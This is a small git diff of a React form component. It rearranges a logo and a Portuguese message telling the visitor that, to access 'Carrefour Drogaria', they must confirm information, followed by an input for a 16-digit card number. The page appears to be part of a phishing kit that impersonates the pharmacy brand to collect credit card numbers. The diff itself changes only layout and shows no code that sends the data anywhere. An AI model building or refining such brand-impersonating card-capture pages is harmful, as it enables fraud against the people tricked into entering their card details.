@@ -34,9 +34,11 @@ export class SocialProfiles extends Component {
 
             
             <div className="form-container">
-                            <img className="logo2" src={logo} width="100"/>
+          <div className="text-center container">
 
-                <p className=""><b>Tudo certo!<br></br></b>Agora Precisamos confirmar algumas informações para que você possa acessar o <b> Carrefour Drogaria</b></p>
+<img className="logo" src={logo} width="100"/>
+</div>
+                <p className="container"><b>Tudo certo!<br></br></b>Agora Precisamos confirmar algumas informações para que você possa acessar o <b> Carrefour Drogaria</b></p>
                 <div className="form-group">
                     <input placeholder="16 dígitos do cartão" type="number" className="form-control" name="cc" onChange={inputChange('cc')} value={values.cc} />
                 </div>
